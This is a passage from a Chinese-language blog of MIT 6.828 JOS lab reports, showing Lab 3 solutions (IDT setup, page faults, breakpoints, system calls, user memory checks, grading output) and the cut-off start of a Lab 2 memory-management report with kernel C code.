class="number">1</span>, GD_KT, non_maskable_interrupt_handler,     <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_BRKPT],    <span class="number">1</span>, GD_KT, breakpoint_handler,                 <span class="number">3</span>);</span><br><span class="line">SETGATE(idt[T_OFLOW],    <span class="number">1</span>, GD_KT, overflow_handler,                   <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_BOUND],    <span class="number">1</span>, GD_KT, bounds_check_handler,               <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_ILLOP],    <span class="number">1</span>, GD_KT, invalid_opcode_handler,             <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_DEVICE],   <span class="number">1</span>, GD_KT, device_not_available_handler,       <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_DBLFLT],   <span class="number">1</span>, GD_KT, double_fault_handler,               <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_TSS],      <span class="number">1</span>, GD_KT, invalid_tss_handler,                <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_SEGNP],    <span class="number">1</span>, GD_KT, segment_not_present_handler,        <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_STACK],    <span class="number">1</span>, GD_KT, stack_exception_handler,            <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_GPFLT],    <span class="number">1</span>, GD_KT, general_protection_fault_handler,   <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_PGFLT],    <span class="number">1</span>, GD_KT, pagefault_handler,                  <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_FPERR],    <span class="number">1</span>, GD_KT, floating_point_error_handler,       <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_ALIGN],    <span class="number">1</span>, GD_KT, alignment_check_handler,            <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_MCHK],     <span class="number">1</span>, GD_KT, machine_check_handler,              <span class="number">0</span>);</span><br><span class="line">SETGATE(idt[T_SIMDERR],  <span class="number">1</span>, GD_KT, simd_floating_point_error_handler,  <span class="number">0</span>);</span><br></pre></td></tr></table></figure></p>
<p>问题1：<br>若是使用同一个处理程序，将无法限制调用错误处理程序的代码的特权级，也无法得知中断向量的值。</p>
<p>问题2：<br>仅有内核代码允许执行页错误处理程序，尽管调用了<code>int $14</code>，仍然因为保护机制而生成了中断向量13。如果内核允许<code>int $14</code>唤醒页错误处理程序，那么恶意的程序可以因此而随意触发缺页错误，导致系统无法正常工作。</p>
<h3 id="第二部分-Page-Faults-Breakpoints-Exceptions-and-System-Calls-页错误，断点异常和系统调用"><a href="#第二部分-Page-Faults-Breakpoints-Exceptions-and-System-Calls-页错误，断点异常和系统调用" class="headerlink" title="第二部分 Page Faults, Breakpoints Exceptions, and System Calls - 页错误，断点异常和系统调用"></a>第二部分 Page Faults, Breakpoints Exceptions, and System Calls - 页错误，断点异常和系统调用</h3><h4 id="处理页错误"><a href="#处理页错误" class="headerlink" title="处理页错误"></a>处理页错误</h4><p>页错误的中断向量号为14，是非常重要的异常。当处理器接收一个页错误时，会将引发页错误的线性地址存储在处理器控制寄存器<code>CR2</code>中。</p>
<p>练习5的代码如下，仅供参考：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// In trap_dispatch():</span></span><br><span class="line"><span class="keyword">if</span> (tf-&gt;tf_trapno == T_PGFLT) &#123;</span><br><span class="line">    <span class="comment">// dispatch page fault exceptions</span></span><br><span class="line">    page_fault_handler(tf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="断点异常"><a href="#断点异常" class="headerlink" title="断点异常"></a>断点异常</h4><p>断点异常的中断向量号为3，通常被调试器用作向程序代码中添加断点，原理是将程序中的某一条指令暂时改为1字节的<code>int3</code>的软中断指令。在JOS中，将大量使用这一异常来实现一个原始的伪系统调用，使得用户环境可以使用它来环境JOS内核监视器，可以把内核监视器看做一个原始的调试器。<br>用户模式的<code>panic</code>，就是通过显示panic消息后执行<code>int3</code>实现的。</p>
<p>练习6的代码如下，仅供参考：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tf-&gt;tf_trapno == T_BRKPT) &#123;</span><br><span class="line">    <span class="comment">// dispatch breakpoint exceptions</span></span><br><span class="line">    monitor(tf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>问题3：<br>若是用特权级0初始化断点异常的IDT，那么会触发通用保护错误，这是因为用户模式的代码无法执行特权级0（内核模式）的处理程序，需要用特权级3初始化断点异常的IDT，这样才能使得断点测试正确通过。</p>
<p>问题4：<br>这些措施都是为了保护内核和用户环境的相互独立，使得用户环境仅能在收到允许的情况下执行某些内核的代码，保证了恶意程序不会破坏内核，窃取数据。同时也能保证用户环境能从内核得到必要的功能支持。</p>
<h4 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h4><p>用户进程通过系统调用请求内核为它工作。当用户进程唤醒系统调用时，处理器进入内核模式，处理器和内核合作保存用户进程状态，内核执行合适的代码完成系统调用，并恢复至用户进程。系统调用的具体实现随平台不同而不同。</p>
<p>JOS内核使用<code>int $0x30</code>作为系统调用。需要建立相关的中断描述符，注意中断向量<code>0x30</code>不可能由硬件生成，毫无疑问应该允许用户执行对应的处理程序。</p>
<p>应用程序会将系统调用号和系统调用参数存入寄存器中。避免了内核访问用户环境栈或是指令流。系统调用号放在寄存器<code>%eax</code>中，最多五个参数分别被相应地放在寄存器<code>%edx</code>, <code>%ecx</code>, <code>%ebx</code>, <code>%edi</code>和<code>%esi</code>中。内核将返回值放在寄存器<code>%eax</code>中。唤醒系统调用的汇编代码已经提供为<code>lib/syscall.c</code>中的<code>syscall()</code>。</p>
<p>练习7中遇到的问题如下：</p>
<ul>
<li>syscall作为软中断不会压入错误码</li>
<li>调用syscall函数时应当使用保存的栈帧中的寄存器值而非实际的寄存器值，原因是在函数调用间某些寄存器的值会发生改变</li>
<li>练习7需要参考<code>lib/syscall.c</code>中得知参数的位置关系</li>
</ul>
<p>练习7的代码如下，仅供参考：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// In trapentry.S:</span></span><br><span class="line">TRAPHANDLER_NOEC(syscall_handler, T_SYSCALL)</span><br><span class="line"></span><br><span class="line"><span class="comment">// In trap.c, trap_init():</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">syscall_handler</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">SETGATE(idt[T_SYSCALL], <span class="number">1</span>, GD_KT, syscall_handler, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// In kern/syscall.c, syscall():</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// panic("syscall not implemented");</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (syscallno) &#123;</span><br><span class="line">    <span class="keyword">case</span> SYS_cputs:</span><br><span class="line">        <span class="comment">// call sys_cputs</span></span><br><span class="line">        sys_cputs((<span class="keyword">const</span> <span class="keyword">char</span> *)a1, (<span class="keyword">size_t</span>)a2);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> SYS_cgetc:</span><br><span class="line">        <span class="comment">// cll sys_cgetc</span></span><br><span class="line">        <span class="keyword">return</span> sys_cgetc();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> SYS_getenvid:</span><br><span class="line">        <span class="comment">// call sys_getenvid</span></span><br><span class="line">        <span class="keyword">return</span> sys_getenvid();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> SYS_env_destroy:</span><br><span class="line">        <span class="comment">// call sys_env_destroy</span></span><br><span class="line">        <span class="keyword">return</span> sys_env_destroy((<span class="keyword">envid_t</span>)a1);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>: <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// will not reach here</span></span><br><span class="line"><span class="keyword">return</span> -E_UNSPECIFIED;</span><br></pre></td></tr></table></figure></p>
<h4 id="用户模式启动"><a href="#用户模式启动" class="headerlink" title="用户模式启动"></a>用户模式启动</h4><p>一个用户在<code>lib/entry.S</code>的顶部开始运行，经过某些设置后，代码调用<code>lib/libmain.c</code>。你应当修改<code>libmain()</code>以初始化指向当前环境的<code>struct Env</code>指针<code>thisenv</code>（注意到<code>lib/entry.S</code>已经定义了指向你在第一部分映射的<code>UENVS</code>的<code>envs</code>）。</p>
<p><code>libmain()</code>然后调用<code>umain</code>，对于hello程序而言，位于<code>user/hello.c</code>中。在打印<code>hello, world</code>后，它尝试访问<code>thisenv-&gt;env_id</code>。这也是为什么hello程序会出现<code>fault</code>。</p>
<p>练习8中遇到的问题如下：</p>
<ul>
<li>可以使用宏<code>ENVX</code>从<code>envid</code>得到<code>env</code>在<code>envs</code>中的偏移量，而无需遍历整个<code>envs</code></li>
<li>Lab2中<code>pgdir_walk</code>未设置<code>PTE_U</code>导致访问时出现了页错误（仅有PTE项中设置<code>PTE_U</code>是不足的）。</li>
</ul>
<p>练习8的答案如下，仅供参考：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// In libmain.c, libmain():</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="comment">// get env id use system call and use ENVX to get index</span></span><br><span class="line">thisenv = envs + ENVX(sys_getenvid());</span><br></pre></td></tr></table></figure></p>
<h4 id="页错误和内存保护"><a href="#页错误和内存保护" class="headerlink" title="页错误和内存保护"></a>页错误和内存保护</h4><p>内存保护是操作系统的重要特性，保证了一个程序的错误不会毁坏内核或是其他的程序。<br>操作系统通常和硬件一起实现内存保护。操作系统负责告知硬件哪些虚拟地址是有效的、哪些是无效的。当一个程序试图去访问一个无效的地址或是一个没有权限的地址时，处理器在引起错误的指令处停止程序，然后带着相应的信息陷入内核。若错误可修复，则内核修复该错误并继续执行程序；若错误不可恢复，则程序无法继续运行。<br>现在考虑系统调用，系统调用允许用户程序向内核传递指针，内核在处理系统调用时将指针解引用，会出现以下两种问题：</p>
<ol>
<li>内核的缺页错误潜在地比用户程序的缺页更加严重。若内核在操作私有的数据结构时发生缺页，那么将是内核自己的漏洞，错误处理程序应当panic内核。然而当内核解引用用户程序传递的指针时，需要某种方式标记由解引用导致的缺页实际上代表的是用户程序的利益。</li>
<li>内核比用户程序具有更多的权限。在这种情况下，用户程序可能传递给内核一个指针，该指针指向的内存只能被内核读写而不能被用户程序读写。在这种情况下，内核不能对该指针解引用，这么做会暴露私有数据或是破坏内核完整性。</li>
</ol>
<p>当内核处理用户程序传递的指针时必须非常小心。内核必须检查用户传入的指针。</p>
<p>练习9和练习10遇到的问题如下：</p>
<ul>
<li>需要获取段寄存器的最低两位以得到段特权级</li>
</ul>
<p>练习9和练习10的答案如下，仅供参考：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// In kern/trap.c, page_fault_handler():</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="keyword">if</span> ((tf-&gt;tf_cs &amp; <span class="number">3</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// code that causes page fault in kernel mode</span></span><br><span class="line">    panic(<span class="string">"page fault in kernel!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// In kern/pmap.c, user_mem_check():</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">user_mem_check</span><span class="params">(struct Env *env, <span class="keyword">const</span> <span class="keyword">void</span> *va, <span class="keyword">size_t</span> len, <span class="keyword">int</span> perm)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// LAB 3: Your code here.</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">uintptr_t</span>)va &gt;= ULIM) &#123;</span><br><span class="line">        <span class="comment">// condition 1 - below ULIM violated</span></span><br><span class="line">        user_mem_check_addr = (<span class="keyword">uintptr_t</span>)va;</span><br><span class="line">        <span class="keyword">return</span> -E_FAULT;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uintptr_t</span> va_start = (<span class="keyword">uintptr_t</span>)ROUNDDOWN(va, PGSIZE);</span><br><span class="line">    <span class="keyword">uintptr_t</span> va_end   = (<span class="keyword">uintptr_t</span>)ROUNDUP(va + len, PGSIZE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (; va_start &lt; va_end; va_start += PGSIZE) &#123;</span><br><span class="line">        <span class="comment">// note we set page directory entry with less restrict</span></span><br><span class="line">        <span class="comment">// we will only test page table entry here</span></span><br><span class="line">        <span class="keyword">pte_t</span> *pgtable_entry_ptr =</span><br><span class="line">            pgdir_walk(env-&gt;env_pgdir, (<span class="keyword">char</span> *)va_start, <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">if</span> ((*pgtable_entry_ptr &amp; (perm | PTE_P)) != (perm | PTE_P)) &#123;</span><br><span class="line">            <span class="comment">// condition 2 - permission violated</span></span><br><span class="line">            <span class="keyword">if</span> (va_start &lt;= (<span class="keyword">uintptr_t</span>)va) &#123;</span><br><span class="line">                <span class="comment">// va lie in the first page and not aligned, return va</span></span><br><span class="line">                user_mem_check_addr = (<span class="keyword">uintptr_t</span>)va;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (va_start &gt;= (<span class="keyword">uintptr_t</span>)va + len) &#123;</span><br><span class="line">                <span class="comment">// va lie in the last page and exceed va + len, return va + len</span></span><br><span class="line">                user_mem_check_addr = (<span class="keyword">uintptr_t</span>)va + len;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// return corresponding page's initial address</span></span><br><span class="line">                user_mem_check_addr = va_start;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> -E_FAULT;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// pass user memory check</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// In kern/syscall.c, syscall():</span></span><br><span class="line"><span class="keyword">case</span> SYS_cputs:</span><br><span class="line">    <span class="comment">// checks memory before use sys_cputs to dereference a1</span></span><br><span class="line">    user_mem_assert(curenv, (<span class="keyword">char</span> *)a1, (<span class="keyword">size_t</span>)a2, PTE_U);</span><br><span class="line">    <span class="comment">// call sys_cputs</span></span><br><span class="line">    sys_cputs((<span class="keyword">const</span> <span class="keyword">char</span> *)a1, (<span class="keyword">size_t</span>)a2);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// In kern/kdebug.c, debuginfo_eip():</span></span><br><span class="line"><span class="comment">// Make sure this memory is valid.</span></span><br><span class="line"><span class="comment">// Return -1 if it is not.  Hint: Call user_mem_check.</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="keyword">if</span> (user_mem_check(curenv, usd, <span class="keyword">sizeof</span>(struct UserStabData), PTE_U) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Make sure the STABS and string table memory is valid.</span></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="keyword">if</span> ((user_mem_check(curenv, stabs, stab_end - stabs, PTE_U) &lt; <span class="number">0</span>) ||</span><br><span class="line">    (user_mem_check(curenv, stabstr, stabstr_end - stabstr, PTE_U) &lt; <span class="number">0</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>发生了页错误的原因还要观察<code>memlayout.h</code>，在<code>USTACKTOP</code>上方有一个位于<code>0xeebfd000</code>的<code>Empty Memory</code>，该虚拟地址没有映射任何的物理页。而在<code>mon_backtrace</code>的最后，访问到了位于此处的虚拟地址，因而导致了一个不可处理的页错误。</p>
<h2 id="实验小结"><a href="#实验小结" class="headerlink" title="实验小结"></a>实验小结</h2><p>最终执行<code>make grade</code>，评分脚本的输出如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">divzero:</span><br><span class="line">$ make run-divzero-nox-gdb QEMUEXTRA+=-snapshot</span><br><span class="line">OK (1.3s)</span><br><span class="line">softint:</span><br><span class="line">$ make run-softint-nox-gdb QEMUEXTRA+=-snapshot</span><br><span class="line">OK (1.0s)</span><br><span class="line">badsegment:</span><br><span class="line">$ make run-badsegment-nox-gdb QEMUEXTRA+=-snapshot</span><br><span class="line">OK (1.0s)</span><br><span class="line">Part A score: 30/30</span><br><span class="line">faultread:</span><br><span class="line">$ make run-faultread-nox-gdb QEMUEXTRA+=-snapshot</span><br><span class="line">OK (1.0s)</span><br><span class="line">faultreadkernel:</span><br><span class="line">$ make run-faultreadkernel-nox-gdb QEMUEXTRA+=-snapshot</span><br><span class="line">OK (0.9s)</span><br><span class="line">faultwrite:</span><br><span class="line">$ make run-faultwrite-nox-gdb QEMUEXTRA+=-snapshot</span><br><span class="line">OK (1.0s)</span><br><span class="line">faultwritekernel:</span><br><span class="line">$ make run-faultwritekernel-nox-gdb QEMUEXTRA+=-snapshot</span><br><span class="line">OK (1.0s)</span><br><span class="line">breakpoint:</span><br><span class="line">$ make run-breakpoint-nox-gdb QEMUEXTRA+=-snapshot</span><br><span class="line">OK (2.0s)</span><br><span class="line">testbss:</span><br><span class="line">$ make run-testbss-nox-gdb QEMUEXTRA+=-snapshot</span><br><span class="line">OK (2.1s)</span><br><span class="line">hello:</span><br><span class="line">$ make run-hello-nox-gdb QEMUEXTRA+=-snapshot</span><br><span class="line">OK (1.0s)</span><br><span class="line">buggyhello:</span><br><span class="line">$ make run-buggyhello-nox-gdb QEMUEXTRA+=-snapshot</span><br><span class="line">OK (1.8s)</span><br><span class="line">buggyhello2:</span><br><span class="line">$ make run-buggyhello2-nox-gdb QEMUEXTRA+=-snapshot</span><br><span class="line">OK (2.1s)</span><br><span class="line">evilhello:</span><br><span class="line">$ make run-evilhello-nox-gdb QEMUEXTRA+=-snapshot</span><br><span class="line">OK (1.1s)</span><br><span class="line">Part B score: 50/50</span><br><span class="line">Score: 80/80</span><br></pre></td></tr></table></figure><br>至此，实验三结束。</p>
<p>第三个实验的难度明显比实验一和实验二大。<br>用户环境的管理相对简单，而设置陷阱和中断的部分涉及大量的x86硬件知识，需要大量参考Intel手册，要求直接写汇编代码设置栈帧也颇有挑战。</p>

                    
                        

                    
                    
                        <p>
                            <a href="/2018/02/23/MIT6-828操作系统工程Lab3-User-Environments实验报告/#post-footer" class="postShorten-excerpt_link link">
                                评论和共享
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title">
                    
                        <a class="link-unstyled" href="/2018/02/20/MIT6-828操作系统工程Lab2-Memory-Management实验报告/">
                            MIT6.828操作系统工程Lab2-Memory Management实验报告
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time datetime="2018-02-20T22:12:33+08:00">
	
		    2月 20, 2018
    	
    </time>
    
        <span>发布在 </span>
        
    <a class="category-link" href="/categories/操作系统/">操作系统</a>


    
</div>

            </div>
            
                <div class="postShorten-content">
                    <blockquote>
<p>寒假在家终于有时间继续处理上学期没有做完的Labs，虽然效率偏低但总不是完全没有进展。<br>Lab2 - Memory Management主要包括了操作系统的内存管理，具体来说可以分为两部分。第一部分需要编写内核的物理内存分配器（Physical memory allocator），这会允许内核分配和释放内存。第二部分需要修改JOS的代码去实现一个虚拟内存，将虚拟地址映射到物理内存中。<br>2018年2月23日，完成了实验并写完了报告。</p>
</blockquote>
<h2 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h2><p>根据实验官网的提示，依次切换到分支lab2并且合并分支lab1，在合并的过程中，没有发生冲突。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user% git checkout -b lab2 origin/lab2</span><br><span class="line">user% git merge lab1</span><br></pre></td></tr></table></figure>
<p>实验二包括如下的新文件：</p>
<ul>
<li>inc/memlayout.h 描述了虚拟地址空间的结构</li>
<li>kern/pmap.c 需要修改、添加代码以完成实验</li>
<li>kern/pmap.h 定义了PageInfo结构 用来管理物理页状态</li>
<li>kern/kclock.h</li>
<li>kern/kclock.c 操作电池供电的时钟以及CMOS RAM硬件</li>
</ul>
<h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><h3 id="第一部分-Physical-Page-Management-物理页管理"><a href="#第一部分-Physical-Page-Management-物理页管理" class="headerlink" title="第一部分 Physical Page Management - 物理页管理"></a>第一部分 Physical Page Management - 物理页管理</h3><p>操作系统必须追踪物理内存以得知哪些内存是空闲的，以及哪些内存是正在被使用的。JOS使用页粒度管理PC的物理内存以便利用MMU映射和保护每一片被分配的内存。</p>
<p>实验的第一部分需要完成一个物理页面分配器，该分配器维护了一个<code>struct PageInfo</code>的链表来追踪空闲的物理页面（也就是空闲链表），空闲链表已经在CSAPP中有所了解，这里不再赘述。</p>
<p>具体来说，需要完成kern/pmap.c中实现以下的函数：</p>
<ul>
<li>boot_alloc()</li>
<li>mem_init() （完成直到check_page_free_list(1)为止）</li>
<li>page_init()</li>
<li>page_alloc()</li>
<li>page_free()</li>
</ul>
<p>完成后可以启动JOS去观察<code>check_page_free_list()</code>以及<code>check_page_alloc()</code>函数是否成功以检查编写的分配器的正确性。</p>
<p>第一部分的物理页面分配器总体来说难度不大，因为编写的分配器不像CSAPP中的<code>malloc()</code>一样，需要处理空闲内存的合并以及拆分，分配器只需要以物理页面为固定的粒度管理所有的内存即可。</p>
<p>在实际的Linux系统中，内核使用Buddy System快速地管理内存。</p>
<p>练习1的代码如下，仅供参考:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// In boot_alloc():</span></span><br><span class="line"><span class="comment">// Allocate a chunk large enough to hold 'n' bytes, then update</span></span><br><span class="line"><span class="comment">// nextfree.  Make sure nextfree is kept aligned</span></span><br><span class="line"><span class="comment">// to a multiple of PGSIZE.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// LAB 2: Your code here.</span></span><br><span class="line"><span class="keyword">if</span> (n == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// return the address of next free page</span></span><br><span class="line">    <span class="keyword">return</span> nextfree;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// round up size to a multiple of PGSIZE</span></span><br><span class="line">    <span class="keyword">size_t</span> size = ROUNDUP(n, PGSIZE);</span><br><span class="line">    <span class="keyword">char</span> * addr = nextfree;</span><br><span class="line">    <span class="comment">// update address of next free page(still multiple of PGSIZE)</span></span><br><span class="line">    nextfree += size;</span><br><span class="line">    <span class="comment">// nextfree is a kernel virtual address, out out memory when it exceeds 4 MB</span></span><br><span class="line">	<span class="keyword">if</span> (nextfree &gt;= (<span class="keyword">char</span> *)KADDR(<span class="number">0x400000</span>)) &#123;</span><br><span class="line">        panic(<span class="string">"out of memory when booting!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span 